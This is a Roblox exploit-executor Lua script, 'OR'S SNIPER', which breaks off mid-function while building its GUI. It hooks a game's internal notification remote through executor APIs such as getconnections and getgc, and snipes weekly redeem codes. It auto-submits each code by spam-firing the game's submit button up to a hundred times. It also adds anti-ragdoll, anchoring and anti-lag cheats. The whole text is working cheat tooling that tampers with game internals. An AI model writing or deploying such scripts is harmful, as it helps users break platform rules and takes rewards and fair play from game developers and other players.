local success, err = pcall(function()
    print("[OR'S SNIPER] Initialising...")

    local cloneref = cloneref or function(object) return object end
    local Players           = cloneref(game:GetService("Players"))
    local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
    local RunService        = cloneref(game:GetService("RunService"))
    local UserInputService  = cloneref(game:GetService("UserInputService"))
    local HttpService       = cloneref(game:GetService("HttpService"))
    local Lighting          = cloneref(game:GetService("Lighting"))
    local Workspace         = cloneref(game:GetService("Workspace"))
    local TweenService      = cloneref(game:GetService("TweenService"))
    local player = Players.LocalPlayer
    if not player then warn("[OR'S SNIPER] No LocalPlayer"); return end
    local playerGui = player:WaitForChild("PlayerGui")

    local _earlyNotifyRemote = nil
    local _earlyNotifyConn = nil
    local _earlyNotifyQueue = {}
    pcall(function()
        local getinfo = debug and (debug.getinfo or debug.info)
        if not (getgc and getinfo and getconnections) then return end
        local function tryAttach(net)
            if _earlyNotifyRemote then return true end
            for _, d in ipairs(net:GetDescendants()) do
                if d:IsA("RemoteEvent") then
                    local ok, cs = pcall(getconnections, d.OnClientEvent)
                    if ok then
                        for _, c in ipairs(cs) do
                            local f, fn = pcall(function() return c.Function end)
                            if f and type(fn) == "function" then
                                local i, info = pcall(getinfo, fn)
                                local src = i and tostring(info.short_src or info.source or "") or ""
                                if src:find("NotificationController", 1, true) then
                                    _earlyNotifyRemote = d
                                    _earlyNotifyConn = d.OnClientEvent:Connect(function(...)
                                        _earlyNotifyQueue[#_earlyNotifyQueue + 1] = {...}
                                    end)
                                    return true
                                end
                            end
                        end
                    end
                end
            end
            return false
        end
        local net = ReplicatedStorage:FindFirstChild("Packages")
            and ReplicatedStorage.Packages:FindFirstChild("Net")
        if net and tryAttach(net) then return end
        task.spawn(function()
            local ok, packages = pcall(function() return ReplicatedStorage:WaitForChild("Packages", 60) end)
            if not ok or not packages then return end
            local ok2, net2 = pcall(function() return packages:WaitForChild("Net", 60) end)
            if not ok2 or not net2 then return end
            tryAttach(net2)
        end)
    end)

    if getgenv and getgenv().StopAura then pcall(getgenv().StopAura) end

    local CONFIG_FILE = "weekly_code_sniper_auto_redeem_test_config.json"
    local DEFAULT_BG_ID = "105543452376246"
    local savedConfig = {
        codeSniper = true, autoSubmit = true, submitAfter = 1,
        spamRedeem = true, spamCount = 20, antiLag = false,
        antiRagdoll = false, anchor = false,
        autoTurnOnRedeem = false, autoTurnOnListen = false,
        autoTurnOnSubmit = false, autoTurnOffSubmit = false,
        autoTurnOffRedeem = false,
        manualMode = false, listenKeybind = "C",
        guiScale = 86, ezCodeNotify = true,
    }
    pcall(function()
        if type(isfile) == "function" and type(readfile) == "function" and isfile(CONFIG_FILE) then
            local decoded = HttpService:JSONDecode(readfile(CONFIG_FILE))
            if type(decoded) == "table" then
                if type(decoded.codeSniper) == "boolean" then savedConfig.codeSniper = decoded.codeSniper end
                if type(decoded.autoSubmit) == "boolean" then savedConfig.autoSubmit = decoded.autoSubmit end
                if type(decoded.submitAfter) == "number" then savedConfig.submitAfter = math.max(1, math.min(4, math.floor(decoded.submitAfter))) end
                if type(decoded.spamRedeem) == "boolean" then savedConfig.spamRedeem = decoded.spamRedeem end
                if type(decoded.spamCount) == "number" then savedConfig.spamCount = math.max(1, math.min(100, math.floor(decoded.spamCount))) end
                if type(decoded.antiLag) == "boolean" then savedConfig.antiLag = decoded.antiLag end
                if type(decoded.antiRagdoll) == "boolean" then savedConfig.antiRagdoll = decoded.antiRagdoll end
                if type(decoded.anchor) == "boolean" then savedConfig.anchor = decoded.anchor end
                if type(decoded.autoTurnOnRedeem) == "boolean" then savedConfig.autoTurnOnRedeem = decoded.autoTurnOnRedeem end
                if type(decoded.autoTurnOnListen) == "boolean" then savedConfig.autoTurnOnListen = decoded.autoTurnOnListen end
                if type(decoded.autoTurnOnSubmit) == "boolean" then savedConfig.autoTurnOnSubmit = decoded.autoTurnOnSubmit end
                if type(decoded.autoTurnOffSubmit) == "boolean" then savedConfig.autoTurnOffSubmit = decoded.autoTurnOffSubmit end
                if type(decoded.autoTurnOffRedeem) == "boolean" then savedConfig.autoTurnOffRedeem = decoded.autoTurnOffRedeem end
                if type(decoded.manualMode) == "boolean" then savedConfig.manualMode = decoded.manualMode end
                if type(decoded.listenKeybind) == "string" and #decoded.listenKeybind >= 1 then savedConfig.listenKeybind = decoded.listenKeybind end
                if type(decoded.guiScale) == "number" then savedConfig.guiScale = math.max(10, math.min(100, math.floor(decoded.guiScale))) end
                if type(decoded.ezCodeNotify) == "boolean" then savedConfig.ezCodeNotify = decoded.ezCodeNotify end
            end
        end
    end)

    local function saveConfig()
        if type(writefile) ~= "function" then return end
        pcall(function()
            writefile(CONFIG_FILE, HttpService:JSONEncode({
                codeSniper = savedConfig.codeSniper, autoSubmit = savedConfig.autoSubmit,
                submitAfter = savedConfig.submitAfter, spamRedeem = savedConfig.spamRedeem,
                spamCount = savedConfig.spamCount, antiLag = savedConfig.antiLag,
                antiRagdoll = savedConfig.antiRagdoll, anchor = savedConfig.anchor,
                autoTurnOnRedeem = savedConfig.autoTurnOnRedeem, autoTurnOnListen = savedConfig.autoTurnOnListen,
                autoTurnOnSubmit = savedConfig.autoTurnOnSubmit, autoTurnOffSubmit = savedConfig.autoTurnOffSubmit,
                autoTurnOffRedeem = savedConfig.autoTurnOffRedeem,
                manualMode = savedConfig.manualMode, listenKeybind = savedConfig.listenKeybind,
                guiScale = savedConfig.guiScale, ezCodeNotify = savedConfig.ezCodeNotify,
            }))
        end)
    end

    local _enabled = savedConfig.codeSniper
    local _seen = {}
    local _lastBox = nil
    local _autoAccept = savedConfig.autoSubmit
    local _submitAfter = math.clamp(tonumber(savedConfig.submitAfter) or 1, 1, 4)
    local _capturedParts = {}
    local _lastWatchedBox = nil
    local _boxTextConn = nil
    local _boxAncestryConn = nil
    local _boxVisibilityConns = {}
    local _spamRedeem = savedConfig.spamRedeem
    local _spamCount = savedConfig.spamCount or 20
    local _lastNonBlankBoxText = ""
    local WEEKLY_CASE_MODE = "LOWER"

    local _guiScale = tonumber(savedConfig.guiScale) or 86
    _guiScale = math.clamp(math.floor(_guiScale / 10 + 0.5) * 10, 10, 100)
    local _guiScales = {}

    local AUTO_SUBMIT_DELAY     = 0.000005
    local AUTO_TURN_ON_DELAY    = 0.0005
    local SPAM_CLICK_DELAY      = 0.0005
    local TOGGLE_COOLDOWN       = 0.2
    local _toggleCooldowns      = {}

    local function canToggle(name)
        local now = tick()
        local last = _toggleCooldowns[name]
        if last and (now - last) < TOGGLE_COOLDOWN then return false end
        _toggleCooldowns[name] = now
        return true
    end

    local function applyGuiScale(pct)
        pct = tonumber(pct) or 86
        pct = math.clamp(math.floor(pct / 10 + 0.5) * 10, 10, 100)
        _guiScale = pct
        savedConfig.guiScale = pct
        saveConfig()
        local s = pct / 100
        for _, us in ipairs(_guiScales) do
            if us and us.Parent then us.Scale = s end
        end
    end

    local _programmaticChange = false
    local AAX = { busy = false, pending = nil, progText = nil }
    local _manualSubmitDebounce = nil

    local _listenKeybind = savedConfig.listenKeybind or "C"
    local _listenInputConnection = nil
    local _capturingListenKey = false

    local _antiLagEnabled = savedConfig.antiLag
    local _antiLagDescendantConn = nil
    local _antiRagdollEnabled = savedConfig.antiRagdoll
    local _ragdollConnection = nil
    local _ragdollCooldown = 0

    local _anchorEnabled = savedConfig.anchor
    local _anchorConn = nil

    local _autoTurnOnRedeem = savedConfig.autoTurnOnRedeem
    local _autoTurnOnListen = savedConfig.autoTurnOnListen
    local _autoTurnOnSubmit = savedConfig.autoTurnOnSubmit
    local _autoTurnOffSubmit = savedConfig.autoTurnOffSubmit
    local _autoTurnOffRedeem = savedConfig.autoTurnOffRedeem
    local _manualModeEnabled = savedConfig.manualMode

    local _manualBuffer = ""
    local _manualResetTimer = nil
    local MANUAL_TIMEOUT = 15

    local autoSubmitBtn, autoSubmitStroke
    local listenBtn, listenStroke
    local manualMainBtn, manualMainStroke
    local SpamToggle, spamToggleStroke
    local setSpamRedeem
    local updateMainStatus

    local function applyToggleVisual(btn, stroke, isOn)
        if not btn then return end
        btn.BackgroundColor3 = Color3.fromRGB(68, 70, 76)
        btn.BackgroundTransparency = 0.12
        if isOn then
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            if stroke then stroke.Transparency = 0.15 end
        else
            btn.TextColor3 = Color3.fromRGB(175, 178, 185)
            if stroke then stroke.Transparency = 0.8 end
        end
    end

    local function turnOffAutoSubmit()
        if not _autoAccept then return end
        _autoAccept = false
        savedConfig.autoSubmit = false
        saveConfig()
        if autoSubmitBtn and autoSubmitBtn.Parent then
            autoSubmitBtn.Text = "OFF"
            applyToggleVisual(autoSubmitBtn, autoSubmitStroke, false)
        end
    end

    local function turnOnAutoSubmit()
        if _autoAccept then return end
        _autoAccept = true
        savedConfig.autoSubmit = true
        saveConfig()
        if autoSubmitBtn and autoSubmitBtn.Parent then
            autoSubmitBtn.Text = "ON"
            applyToggleVisual(autoSubmitBtn, autoSubmitStroke, true)
        end
    end

    local function turnOffRedeem()
        if not _spamRedeem then return end
        if setSpamRedeem then
            setSpamRedeem(false)
        else
            _spamRedeem = false
            savedConfig.spamRedeem = false
            saveConfig()
        end
    end

    local function clearManualBuffer()
        _manualBuffer = ""
        if _manualResetTimer then
            pcall(task.cancel, _manualResetTimer)
            _manualResetTimer = nil
        end
    end

    local getconns = getconnections or (debug and debug.getconnections)

    local setStatus, appendToBox
    local clearWeeklyCapture

    local ANTILAG_BATCH = 40
    local ANTILAG_BATCH_DELAY = 0.05

    local function processDescendant(obj)
        if not obj or not obj.Parent then return end
        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") then
            pcall(function() obj.Enabled = false end)
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            pcall(function() obj.Transparency = 1 end)
        elseif obj:IsA("BasePart") then
            local parent = obj.Parent
            local isChar = false
            if parent and parent:IsA("Model") then isChar = parent:FindFirstChildOfClass("Humanoid") ~= nil end
            if not isChar then
                pcall(function()
                    obj.Material = Enum.Material.Plastic
                    obj.Reflectance = 0
                    obj.CastShadow = false
                end)
            end
        end
    end

    local function optimizeLighting()
        pcall(function()
            Lighting.GlobalShadows = false
            Lighting.FogEnd = 9000000488
            Lighting.Brightness = 1
            Lighting.EnvironmentDiffuseScale = 0
            Lighting.EnvironmentSpecularScale = 0
        end)
        for _, effect in pairs(Lighting:GetChildren()) do
            if effect:IsA("BlurEffect") or effect:IsA("SunRaysEffect") or effect:IsA("ColorCorrectionEffect") or effect:IsA("BloomEffect") or effect:IsA("DepthOfFieldEffect") then
                pcall(function() effect.Enabled = false end)
            end
        end
    end

    local _antiLagQueue = {}
    local _antiLagProcessing = false

    local function flushAntiLagQueue()
        if _antiLagProcessing then return end
        _antiLagProcessing = true
        task.spawn(function()
            while #_antiLagQueue > 0 and _antiLagEnabled do
                local n = math.min(ANTILAG_BATCH, #_antiLagQueue)
                for _ = 1, n do
                    local obj = table.remove(_antiLagQueue, 1)
                    if obj and obj.Parent then pcall(processDescendant, obj) end
                end
                task.wait(ANTILAG_BATCH_DELAY)
            end
            _antiLagProcessing = false
        end)
    end

    local function startAntiLag()
        if _antiLagEnabled then return end
        _antiLagEnabled = true
        pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
        optimizeLighting()
        if _antiLagDescendantConn then _antiLagDescendantConn:Disconnect() end
        _antiLagDescendantConn = Workspace.DescendantAdded:Connect(function(obj)
            if not _antiLagEnabled then return end
            if #_antiLagQueue > 300 then return end
            _antiLagQueue[#_antiLagQueue + 1] = obj
            flushAntiLagQueue()
        end)
        task.spawn(function()
            local all = Workspace:GetDescendants()
            local count = 0
            for _, obj in ipairs(all) do
                if not _antiLagEnabled then return end
                pcall(processDescendant, obj)
                count = count + 1
                if count % ANTILAG_BATCH == 0 then task.wait(ANTILAG_BATCH_DELAY) end
            end
        end)
    end

    local function stopAntiLag()
        _antiLagEnabled = false
        _antiLagQueue = {}
        if _antiLagDescendantConn then _antiLagDescendantConn:Disconnect(); _antiLagDescendantConn = nil end
    end

    local function forceReset()
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum or not root or hum.Health <= 0 then return end
        pcall(function()
            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
            root.Velocity = Vector3.zero
            root.RotVelocity = Vector3.zero
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
            for _, obj in ipairs(char:GetDescendants()) do
                if obj:IsA("Motor6D") then obj.Enabled = true end
                if obj:IsA("Constraint") then obj.Enabled = true end
            end
            workspace.CurrentCamera.CameraSubject = hum
            local PM = player.PlayerScripts:FindFirstChild("PlayerModule")
            if PM then
                local CM = require(PM:FindFirstChild("ControlModule"))
                if CM then CM:Enable() end
            end
            hum.AutoRotate = true
            hum.PlatformStand = false
            hum.Sit = false
        end)
    end

    local function startAntiRagdoll()
        if _ragdollConnection then return end
        _antiRagdollEnabled = true
        _ragdollConnection = RunService.Heartbeat:Connect(function()
            if not _antiRagdollEnabled then return end
            local char = player.Character
            if not char then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not hum or hum.Health <= 0 then return end
            local state = hum:GetState()
            local isRagdolled = (state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown)
            if isRagdolled then
                local now = tick()
                if now - _ragdollCooldown > 0.15 then
                    _ragdollCooldown = now
                    forceReset()
                end
            end
        end)
    end

    local function stopAntiRagdoll()
        _antiRagdollEnabled = false
        if _ragdollConnection then _ragdollConnection:Disconnect(); _ragdollConnection = nil end
    end

    local function anchorCharacterParts()
        local char = player.Character
        if not char then return end
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then part.Anchored = true end
        end
    end

    local function startAnchor()
        if _anchorConn then _anchorConn:Disconnect() end
        _anchorEnabled = true
        _anchorConn = RunService.Heartbeat:Connect(function()
            if not _anchorEnabled then return end
            anchorCharacterParts()
        end)
    end

    local function stopAnchor()
        _anchorEnabled = false
        if _anchorConn then _anchorConn:Disconnect(); _anchorConn = nil end
        local char = player.Character
        if char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.Anchored = false end
            end
        end
    end

    player.CharacterAdded:Connect(function()
        task.wait(0.3)
        if _anchorEnabled then anchorCharacterParts() end
    end)

    local function isOurGui(instance)
        local p = instance
        for _ = 1, 10 do
            if not p then break end
            if p.Name == "ORSniperUI" or p.Name == "ORSniperRedeemerGui" or p.Name == "ORSniperSettingsUI" then return true end
            p = p.Parent
        end
        return false
    end

    local function isVisibleChain(inst)
        local current = inst
        while current do
            if current:IsA("GuiObject") and not current.Visible then return false end
            if current:IsA("ScreenGui") then return current.Enabled end
            current = current.Parent
        end
        return true
    end

    local function findAllTextBoxes(pg)
        local boxes = {}
        for _, gui in ipairs(pg:GetChildren()) do
            if gui:IsA("ScreenGui") and gui.Enabled and not isOurGui(gui) then
                for _, d in ipairs(gui:GetDescendants()) do
                    if d:IsA("TextBox") and not isOurGui(d) then boxes[#boxes + 1] = d end
                end
            end
        end
        return boxes
    end

    local function findCodeButtons(pg)
        local btns = {}
        for _, gui in ipairs(pg:GetChildren()) do
            if gui:IsA("ScreenGui") and gui.Enabled and not isOurGui(gui) then
                for _, d in ipairs(gui:GetDescendants()) do
                    if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) then
                        local n = d.Name:lower()
                        local pn = (d.Parent and d.Parent.Name or ""):lower()
                        if (n:find("code") or n:find("redeem") or pn:find("code") or pn:find("redeem")) and isVisibleChain(d) then
                            btns[#btns + 1] = d
                        end
                    end
                end
            end
        end
        return btns
    end

    local function clickButton(btn)
        if not btn then return false end
        local fired = false
        if typeof(firesignal) == "function" then
            if pcall(firesignal, btn.MouseButton1Click) then fired = true end
            if pcall(firesignal, btn.Activated) then fired = true end
        end
        if not fired and typeof(getconns) == "function" then
            for _, sig in ipairs({ btn.MouseButton1Click, btn.Activated }) do
                local ok, cs = pcall(getconns, sig)
                if ok and type(cs) == "table" then
                    for _, c in ipairs(cs) do
                        if pcall(function() c:Fire() end) then fired = true end
                    end
                end
            end
        end
        return true
    end

    local function fireBoxFocusLost(box)
        if not box then return false end
        if typeof(firesignal) == "function" then
            pcall(firesignal, box.FocusLost, true)
        end
        if typeof(getconns) == "function" then
            local ok, cs = pcall(getconns, box.FocusLost)
            if ok and type(cs) == "table" then
                for _, c in ipairs(cs) do
                    pcall(function()
                        if c.Enabled ~= false then c:Fire(true) end
                    end)
                end
            end
        end
        return true
    end

    function AAX.submitNow(code)
        if _autoTurnOnRedeem and not _spamRedeem then
            task.wait(AUTO_TURN_ON_DELAY)
            if setSpamRedeem then setSpamRedeem(true) end
        end
        local perClickDelay = SPAM_CLICK_DELAY
        local pg = playerGui or player:FindFirstChildOfClass("PlayerGui")
        if not pg then return false, "no PlayerGui" end

        local codesGui = pg:FindFirstChild("Codes")
        if codesGui then
            if codesGui:IsA("ScreenGui") then codesGui.Enabled = true end
            local codesFrame = codesGui:FindFirstChild("Codes") or codesGui
            if codesFrame then
                if codesFrame:IsA("GuiObject") then codesFrame.Visible = true end
                local cur = codesFrame
                while cur and cur ~= codesGui do
                    if cur:IsA("GuiObject") then cur.Visible = true end
                    cur = cur.Parent
                end
                local box = nil
                for _, d in ipairs(codesFrame:GetDescendants()) do
                    if d:IsA("TextBox") and not isOurGui(d) then box = d; break end
                end
                local submitBtn = nil
                for _, d in ipairs(codesFrame:GetDescendants()) do
                    if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) then
                        local n = d.Name:lower()
                        local txt = ""
                        pcall(function() txt = d.Text:lower() end)
                        if n:find("submit") or txt:find("submit") or n:find("redeem") or txt:find("redeem") or n:find("claim") or txt:find("confirm") or n:find("enter") then
                            submitBtn = d; break
                        end
                    end
                end
                if not submitBtn then
                    for _, d in ipairs(codesFrame:GetDescendants()) do
                        if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) then
                            local n = d.Name:lower()
                            if not n:find("close") and not n:find("x") and not n:find("toggle") then submitBtn = d; break end
                        end
                    end
                end
                if box then
                    pcall(function() box.Text = code end)
                    if submitBtn then
                        if _spamRedeem then
                            for i = 1, _spamCount do
                                if AAX.pending then break end
                                clickButton(submitBtn)
                                task.wait(perClickDelay)
                            end
                        else
                            clickButton(submitBtn)
                        end
                    end
                    fireBoxFocusLost(box)
                    if _autoTurnOffRedeem and _spamRedeem then turnOffRedeem() end
                    return true, "submitted via PlayerGui.Codes"
                end
            end
        end

        local btns = findCodeButtons(pg)
        for _, btn in ipairs(btns) do
            clickButton(btn)
            task.wait(0)
        end
        local box = nil
        local deadline = tick() + 2
        while tick() < deadline do
            local allBoxes = findAllTextBoxes(pg)
            for _, d in ipairs(allBoxes) do
                if isVisibleChain(d) then
                    local n = d.Name:lower()
                    local pn = (d.Parent and d.Parent.Name or ""):lower()
                    if n:find("code") or pn:find("code") or n:find("redeem") or pn:find("redeem") or n:find("input") or pn:find("textbox") or n:find("enter") then box = d; break end
                end
            end
            if not box then
                for _, d in ipairs(allBoxes) do
                    if isVisibleChain(d) then box = d; break end
                end
            end
            if box then break end
            task.wait()
        end
        if not box then return false, "no codebox visible" end
        pcall(function() box.Text = code end)
        local redeemBtn = nil
        local searchNames = {"submit","redeem","claim","confirm","enter","send","apply","ok","use","go","check"}
        local p = box.Parent
        for _ = 1, 8 do
            if not p then break end
            for _, d in ipairs(p:GetDescendants()) do
                if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) and d ~= box then
                    local n = d.Name:lower()
                    local txt = ""
                    pcall(function() txt = d.Text:lower() end)
                    for _, sn in ipairs(searchNames) do
                        if n:find(sn) or txt:find(sn) then
                            if isVisibleChain(d) then redeemBtn = d; break end
                        end
                    end
                    if redeemBtn then break end
                end
            end
            if redeemBtn then break end
            p = p.Parent
        end
        if redeemBtn then
            if _spamRedeem then
                for i = 1, _spamCount do
                    if AAX.pending then break end
                    clickButton(redeemBtn)
                    task.wait(perClickDelay)
                end
            else
                clickButton(redeemBtn)
            end
        end
        fireBoxFocusLost(box)
        if _autoTurnOffRedeem and _spamRedeem then turnOffRedeem() end
        return true, "submitted via dynamic search"
    end

    local function typeAndSubmitCode(code)
        if AAX.busy then
            AAX.pending = code
            return true, "queued"
        end
        AAX.busy = true
        local okc, ok, msg = pcall(AAX.submitNow, code)
        while AAX.pending do
            local nxt = AAX.pending
            AAX.pending = nil
            pcall(AAX.submitNow, nxt)
        end
        AAX.busy = false
        if not okc then return false, tostring(ok) end
        return ok, msg
    end

    local function weeklyCodeBox()
        local pg = playerGui
        local allBoxes = findAllTextBoxes(pg)
        for _, box in ipairs(allBoxes) do
            if isVisibleChain(box) then return box end
        end
        return nil
    end

    local COLORS = {
        Window = Color3.fromRGB(17, 18, 22),
        Section = Color3.fromRGB(31, 33, 39),
        Row = Color3.fromRGB(24, 26, 31),
        Control = Color3.fromRGB(66, 70, 80),
        Log = Color3.fromRGB(18, 20, 25),
        Border = Color3.fromRGB(184, 190, 202),
        White = Color3.fromRGB(255, 255, 255),
        Text = Color3.fromRGB(239, 240, 243),
        Dim = Color3.fromRGB(165, 168, 175),
        Accent = Color3.fromRGB(205, 208, 214),
        SectionLabel = Color3.fromRGB(245, 246, 248),
        Grey = Color3.fromRGB(178, 181, 188),
        PureWhite = Color3.fromRGB(255, 255, 255),
    }

    local FONT_TITLE  = Enum.Font.GothamBold
    local FONT_BOLD   = Enum.Font.GothamBold
    local FONT_MEDIUM = Enum.Font.GothamMedium

    local _bgId = DEFAULT_BG_ID
    local BACKGROUND_IMAGE_ID = "rbxassetid://" .. DEFAULT_BG_ID
    local _bgImages = {}
    local function applyBackground()
        for _, img in ipairs(_bgImages) do
            if img and img.Parent then img.Image = BACKGROUND_IMAGE_ID end
        end
        return true
    end
    local BG_TINT = Color3.fromRGB(255, 255, 255)
    local DARK_OVERLAY_TRANS = 0.58
    local TEXT_STROKE_COLOR = Color3.fromRGB(0, 0, 0)
    local TEXT_STROKE_TRANS = 0.1
    local BULLET = "\226\128\162"

    local function addCorner(parent, radius)
        local value = Instance.new("UICorner")
        value.CornerRadius = UDim.new(0, radius)
        value.Parent = parent
        return value
    end

    local function addStroke(parent, color, thickness, transparency)
        local value = Instance.new("UIStroke")
        value.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        value.Color = color
        value.Thickness = thickness or 1
        value.Transparency = transparency or 0
        value.Parent = parent
        return value
    end

    local function addTextStroke(obj, thickness, transparency)
        local s = Instance.new("UIStroke")
        s.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
        s.Color = TEXT_STROKE_COLOR
        s.Thickness = thickness or 1
        s.Transparency = transparency or TEXT_STROKE_TRANS
        s.Parent = obj
        return s
    end

    local function makeLabel(parent, name, text, size, position, textSize, color, font)
        local label = Instance.new("TextLabel")
        label.Name = name
        label.Size = size
        label.Position = position
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextSize = textSize
        label.TextColor3 = color
        label.Font = font or FONT_MEDIUM
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.TextYAlignment = Enum.TextYAlignment.Center
        label.Parent = parent
        addTextStroke(label, 1, TEXT_STROKE_TRANS)
        return label
    end

    local function styleButton(btn, textSize)
        btn.TextSize = textSize or 12
        btn.Font = FONT_BOLD
        btn.AutoButtonColor = false
        btn.BorderSizePixel = 0
        btn.Active = true
        btn.Selectable = true
        addCorner(btn, 6)
        addTextStroke(btn, 1, TEXT_STROKE_TRANS)
    end

    print("[OR'S SNIPER] Building GUI...")

    pcall(function()
        for _, name in ipairs({"ORSniperUI", "ORSniperSettingsUI", "ORSniperAutoTypeUI", "ORSniperPaste"}) do
            local previous = game.CoreGui:FindFirstChild(name)
            if previous then previous:Destroy() end
        end
    end)
    for _, name in ipairs({"ORSniperUI", "ORSniperSettingsUI", "ORSniperAutoTypeUI", "ORSniperPaste"}) do
        local previous = playerGui:FindFirstChild(name)
        if previous then previous:Destroy() end
    end

    local WINDOW_WIDTH = 276
    local WINDOW_HEIGHT = 366
    local COLLAPSED_HEIGHT = 54

    local GUI = Instance.new("ScreenGui")
    GUI.Name = "ORSniperUI"
    GUI.ResetOnSpawn = false
    GUI.IgnoreGuiInset = true
    GUI.DisplayOrder = 999
    GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    if not pcall(function() GUI.Parent = game.CoreGui end) then GUI.Parent = playerGui end

    local Window = Instance.new("Frame")
    Window.Name = "Window"
    Window.Size = UDim2.fromOffset(WINDOW_WIDTH, WINDOW_HEIGHT)
    Window.AnchorPoint = Vector2.new(0.5, 0)
    do
        local vp = (workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize) or Vector2.new(1280, 720)
        Window.Position = UDim2.fromOffset(vp.X - 8 - (WINDOW_WIDTH * (_guiScale / 100)) / 2, 8)
    end
    Window.BackgroundColor3 = COLORS.Window
    Window.BackgroundTransparency = 0.42
    Window.BorderSizePixel = 0
    Window.ClipsDescendants = true
    Window.ZIndex = 1
    Window.Parent = GUI
    addCorner(Window, 16)
    addStroke(Window, Color3.fromRGB(225, 229, 238), 1.5, 0.10)

    local InterfaceScale = Instance.new("UIScale")
    InterfaceScale.Scale = _guiScale / 100
    InterfaceScale.Parent = Window
    table.insert(_guiScales, InterfaceScale)

    local BackgroundImage = Instance.new("ImageLabel")
    BackgroundImage.Name = "ORSniperBackground"
    BackgroundImage.Size = UDim2.new(1, 0, 1, 0)
    BackgroundImage.BackgroundTransparency = 1
    BackgroundImage.Image = "rbxassetid://105543452376246"
    BackgroundImage.ImageColor3 = BG_TINT
    BackgroundImage.ScaleType = Enum.ScaleType.Stretch
    BackgroundImage.ZIndex = 1
    BackgroundImage.Parent = Window
    addCorner(BackgroundImage, 14)
    table.insert(_bgImages, BackgroundImage)

    local DarkOverlay = Instance.new("Frame")
    DarkOverlay.Name = "DarkOverlay"
    DarkOverlay.Size = UDim2.new(1, 0, 1, 0)
    DarkOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    DarkOverlay.BackgroundTransparency = DARK_OVERLAY_TRANS
    DarkOverlay.BorderSizePixel = 0
    DarkOverlay.ZIndex = 2
    DarkOverlay.Parent = Window
    addCorner(DarkOverlay, 14)

    local Header = Instance.new("Frame")
    Header.Name = "Header"
    Header.Size = UDim2.new(1, 0, 0, 56)
    Header.BackgroundTransparency = 1
    Header.Active = true
    Header.ZIndex = 3
    Header.Parent = Window

    local TitleLabel = makeLabel(Header, "Title", "OR'S SNIPER",
        UDim2.new(1, -44, 1, 0), UDim2.fromOffset(16, 0), 17,
        Color3.fromRGB(255, 255, 255), FONT_TITLE)
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
    TitleLabel.TextYAlignment = Enum.TextYAlignment.Center
    addTextStroke(TitleLabel, 1.5, 0.05)

    local MinimizeBtn = Instance.new("TextButton")
    MinimizeBtn.Name = "MinimizeBtn"
    MinimizeBtn.Size = UDim2.fromOffset(22, 18)
    MinimizeBtn.Position = UDim2.new(1, -28, 0.5, -9)
    MinimizeBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    MinimizeBtn.BackgroundTransparency = 0.15
    MinimizeBtn.BorderSizePixel = 0
    MinimizeBtn.AutoButtonColor = false
    MinimizeBtn.Active = true
    MinimizeBtn.Text = "-"
    MinimizeBtn.TextSize = 18
    MinimizeBtn.TextColor3 = COLORS.PureWhite
    MinimizeBtn.Font = FONT_BOLD
    MinimizeBtn.ZIndex = 5
    MinimizeBtn.Parent = Header
    addCorner(MinimizeBtn, 5)
    addStroke(MinimizeBtn, Color3.fromRGB(90, 90, 90), 1, 0.35)
    addTextStroke(MinimizeBtn, 1, TEXT_STROKE_TRANS)

    local _isCollapsed = false

    local Console, ConsoleOutput, updateConsoleCanvas

    local TabBar = Instance.new("Frame")
    TabBar.Name = "TabBar"
    TabBar.Size = UDim2.new(1, -28, 0, 30)
    TabBar.Position = UDim2.fromOffset(14, 60)
    TabBar.BackgroundTransparency = 1
    TabBar.ZIndex = 4
    TabBar.Parent = Window

    local TAB_ACCENT = Color3.fromRGB(238, 241, 247)
    local TAB_GRADIENT_IDLE = ColorSequence.new(Color3.fromRGB(92, 98, 111), Color3.fromRGB(35, 38, 45))
    local TAB_GRADIENT_ACTIVE = ColorSequence.new(Color3.fromRGB(157, 165, 180), Color3.fromRGB(54, 58, 68))
    local _tabEntries = {}

    local function makeTabButton(text, xPos)
        local btn = Instance.new("TextButton")
        btn.Name = text .. "TabBtn"
        btn.Size = UDim2.new(0.33, -4, 1, 0)
        btn.Position = UDim2.new(xPos, 0, 0, 0)
        btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        btn.BackgroundTransparency = 0.25
        btn.BorderSizePixel = 0
        btn.AutoButtonColor = false
        btn.Active = true
        btn.Text = text
        btn.TextSize = 11
        btn.TextColor3 = COLORS.Dim
        btn.Font = FONT_BOLD
        btn.ZIndex = 5
        btn.Parent = TabBar
        addCorner(btn, 8)

        local gradient = Instance.new("UIGradient")
        gradient.Rotation = 90
        gradient.Color = TAB_GRADIENT_IDLE
        gradient.Parent = btn

        local stroke = addStroke(btn, COLORS.Border, 1, 0.6)
        addTextStroke(btn, 1, TEXT_STROKE_TRANS)

        local bar = Instance.new("Frame")
        bar.Name = "ActiveBar"
        bar.AnchorPoint = Vector2.new(0.5, 1)
        bar.Size = UDim2.new(0, 0, 0, 2)
        bar.Position = UDim2.new(0.5, 0, 1, -2)
        bar.BackgroundColor3 = TAB_ACCENT
        bar.BorderSizePixel = 0
